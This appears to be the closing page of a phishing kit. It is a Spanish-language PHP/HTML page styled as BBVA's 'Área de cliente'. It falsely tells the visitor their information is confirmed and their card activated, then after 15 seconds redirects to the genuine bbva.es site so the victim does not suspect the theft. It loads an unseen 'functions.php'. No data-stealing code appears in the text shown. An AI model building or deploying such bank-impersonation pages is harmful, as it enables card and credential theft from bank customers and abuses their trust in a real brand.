<?php 
require_once "functions.php";
?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="utf-8">
  <title>BBVA - Confirmación</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" crossorigin="anonymous">
  <style>
    * {
      box-sizing: border-box;
    }
    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      background-color: #ffffff;
      min-height: 100vh;
    }
    .container {
      width: 100%;
      max-width: 400px;
      padding: 20px;
      margin: auto;
    }
    .top-bar {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 10px 0;
    }
    .top-bar h2 {
      font-size: 16px;
      margin: 0;
      color: #001b50;
    }
    .top-bar-icons {
      display: flex;
      gap: 15px;
    }
    .top-bar-icons div {
      text-align: center;
      font-size: 10px;
      color: #001b50;
    }
    .top-bar-icons i {
      display: block;
      font-size: 18px;
      background-color: #f5f5f5;
      border-radius: 50%;
      width: 30px;
      height: 30px;
      line-height: 30px;
      text-align: center;
      margin: 0 auto 5px;
      color: #001b50;
    }
    h3 {
      text-align: center;
      color: #001b50;
      margin-bottom: 15px;
    }
    .form {
      background: #fff;
      padding: 30px 40px;
      box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
      border-radius: 12px;
    }
    .form img {
      max-width: 100px;
      margin: 20px auto;
      display: block;
    }
    .message {
      text-align: center;
      font-size: 16px;
      color: #333;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="top-bar">
      <h2>Área de cliente</h2>
      <div class="top-bar-icons">
        <div>
          <i class="fas fa-question"></i>
          Ayuda
        </div>
      </div>
    </div>
    <div class="form">
      <form action="#" method="post">
        <img src="image/valid.gif" alt="Validación exitosa">
        <div class="message"><b>Confirmación de su información, su tarjeta está activada</b></div>
      </form>
    </div>
  </div>
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script>
    setTimeout(function () {
      window.location.href = 'https://www.bbva.es/personas.html';
    }, 15000);
  </script>
</body>
</html>
